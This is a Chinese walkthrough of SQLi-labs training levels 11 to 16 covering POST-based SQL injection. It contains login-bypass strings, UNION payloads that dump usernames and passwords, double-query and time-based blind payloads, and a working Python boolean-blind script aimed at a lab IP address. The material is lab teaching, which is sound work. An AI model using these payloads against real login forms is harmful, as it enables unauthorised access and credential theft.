@@ -1,0 +1,205 @@
+写在前面：今天介绍的是post注入。
+
+自己总结了一些万能密码：
+
+1："or "a"="a
+2： ')or('a'='a
+3：or 1=1--
+4：'or 1=1--
+5：a'or' 1=1--
+6："or 1=1--
+7：'or'a'='a
+8："or"="a'='a
+9：'or''='
+10：'or'='or'
+11：1 or '1'='1'=1
+12：1 or '1'='1' or 1=1
+13： 'OR 1=1%00
+
+其实个人习惯性使用
+admin'#
+admin')#
+admin"#
+admin")#
+admin'or'1'='1#
+等等来构造恒真语句（密码随便输）
+
+less-11
+
+1.使用万能密码注入
+
+用户名：admin'#
+密码随便输。（之后都是随便输，我后面就只说用户名输什么了）
+显示用admin账户登录，表明可以注入
+
+2.猜字段
+
+uname=123&passwd=q%27order by 2%23&submit=Submit
+
+字段数为2
+
+3.爆数据库
+
+用户名输入：1admin'union select 1,database()#
+
+爆出数据库为security
+
+3.爆表
+
+uname=123&passwd=q%27union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'%23&submit=Submit
+
+爆出表emails,referers,uagents,users
+
+或者
+
+uname=1admin'union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'%23&passwd=1&submit=Submit
+
+
+ps：这里遇到一个坑，在post传参的时候#是不能用--+代替的，最好使用%23
+
+4.爆列
+
+uname=1admin'union select 1,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'%23&passwd=1&submit=Submit
+
+id,username,password
+
+
+5.爆数据
+
+uname=abc'union select 1,concat_ws(char(32,58,32),id,username,password) from users limit 1,1%23&passwd=1&submit=Submit
+
+或者
+
+uname=1admin'union select password,username from users where id=2%23&passwd=1&submit=Submit
+
+或者一次性爆出所有信息
+
+uname=abc'union select group_concat(username),group_concat(password) from users limit 1,1%23&passwd=1&submit=Submit
+
+
+less-11 over！
+
+less-12
+
+按照less-11的payload，单引号换双引号试一下，发现报错
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union select group_concat(username),group_concat(password) from users#") and pas' at line 1
+
+那就是少了个），换")即可
+
+
+less-12 over！
+
+less-13
+
+尝试注入点
+
+admin'
+
+发现报错
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1') LIMIT 0,1' at line 1
+
+说明闭合还差个括号
+
+尝试admin')#注入
+
+分析一下：不会显示你的登录信息了，只能给你一个是否登录成功的返回数据。那我们这里可以用下布尔类型的盲注。
+
+布尔型盲注我在我前面的文章《SQLI-LABS修炼笔记（二）》已经细讲过了，可以看看。
+
+直接上脚本爆数据库：
+
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+import requests
+#uname=' )or  (select substr((select database()),1,1))='s' # &passwd=1
+url = "http://43.247.91.228:84/Less-13/";
+name =""
+database_length=0
+#正确的话就存在 flag.jpg
+database_length_payload = "uname=' ) or length((select database()))={0} #"
+database_name_payload = "uname=' )or  (select substr((select database()),{0},1))='{1}' # &passwd=1"
+def get_response(payload,value,*args):
+    if len(args)==0:
+        payload=payload.format(value)
+        data = {'uname': payload, 'passwd': '1'}
+    else:
+        payload = payload.format(value,args[0])
+        data = {'uname': payload, 'passwd': '1'}
+    print(data)
+    html = requests.post(url, data=data)
+    if "flag.jpg" in html.text:
+        return True
+    else:
+        return False
+for n in range(100):
+    if get_response(database_length_payload,n):
+        print("[+] database_length is {0}".format(n) )
+        database_length=n
+        break
+for nn in range(1,database_length+1):
+    for v in "qwertyuioplkjhgfdsazxcvbnm":
+        if get_response(database_name_payload,nn,v):
+            name =name+v
+            print("[+] database name is {0}".format(name))
+            break
+print("[*] database name is {0}".format(name))
+
+
+也可以使用双注入！双注入我之前的文章《SQLI-LABS修炼笔记（二）》里面也写了，这里直接上payload。
+
+
+
+
+uname=1&passwd=1')union select count(*),concat(':',(select concat(username,char(32,44,32),password) from users limit 0,1),':',floor(rand(0)*2)) as a from information_schema.tables group by a%23
+
+less-13 over!
+
+less-14
+
+测试注入点
+
+admin'
+
+没有回显，再测试
+
+admin"
+
+发现报错回显
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"admin"" and password="" LIMIT 0,1' at line 1
+
+按照less-13的payload，把')换成"就行。
+
+less-14 over！
+
+less-15
+
+怎么测试都找不到报错回显，那应该是基于时间的盲注了。
+
+测试一下
+
+uname=admin'and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&passwd=11&submit=Submit
+
+正确的时候可以直接登录，不正确的时候延时5秒。
+
+试一下果然是基于时间的盲注。
+
+脚本跑一下，爆出信息。
+
+less-15 over！
+
+less-16
+
+这题很迷，卡了n久，后来发现就是基于时间的盲注。
+
+less-15的脚本单引号换双引号就行。
+
+less-16 over！
+
+
+
+
+
